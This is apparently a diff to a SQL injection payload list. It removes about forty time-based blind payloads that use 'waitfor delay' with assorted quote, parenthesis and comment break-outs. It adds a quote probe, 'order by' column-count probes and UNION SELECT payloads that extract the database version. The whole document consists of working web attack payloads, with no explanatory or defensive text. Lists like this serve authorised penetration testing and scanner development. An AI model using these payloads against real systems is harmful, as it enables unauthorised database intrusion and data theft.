@@ -1,40 +1,7 @@
- waitfor delay '0:1:20' /* 
- waitfor delay '0:1:20' --
-' waitfor delay '0:1:20' /* 
-' waitfor delay '0:0:20' --
-" waitfor delay '0:0:20' /* 
-" waitfor delay '0:0:20' --
-) waitfor delay '0:0:20' /* 
-) waitfor delay '0:0:20' --
-)) waitfor delay '0:0:20' /* 
-)) waitfor delay '0:0:20' --
-))) waitfor delay '0:0:20' /* 
-))) waitfor delay '0:0:20' --
-)))) waitfor delay '0:0:20' /* 
-)))) waitfor delay '0:0:20' --
-))))) waitfor delay '0:0:20' --
-)))))) waitfor delay '0:0:20' --
-') waitfor delay '0:0:20' /* 
-') waitfor delay '0:0:20' --
-") waitfor delay '0:0:20' /* 
-") waitfor delay '0:0:20' --
-')) waitfor delay '0:0:20' /* 
-')) waitfor delay '0:0:20' --
-")) waitfor delay '0:0:20' /* 
-")) waitfor delay '0:0:20' --
-'))) waitfor delay '0:0:20' /* 
-'))) waitfor delay '0:0:20' --
-"))) waitfor delay '0:0:20' /* 
-"))) waitfor delay '0:0:20' --
-')))) waitfor delay '0:0:20' /* 
-')))) waitfor delay '0:0:20' --
-")))) waitfor delay '0:0:20' /* 
-")))) waitfor delay '0:0:20' --
-'))))) waitfor delay '0:0:20' /* 
-'))))) waitfor delay '0:0:20' --
-"))))) waitfor delay '0:0:20' /* 
-"))))) waitfor delay '0:0:20' --
-')))))) waitfor delay '0:0:20' /* 
-')))))) waitfor delay '0:0:20' --
-")))))) waitfor delay '0:0:20' /* 
-")))))) waitfor delay '0:0:20' --
+'
+1 order by 1--+
+1 order by 2--+
+1 order by 3--+
+1 order by 4--+
+-1 union select 1,2,3--+
+-1 union select @@version,2,3--+
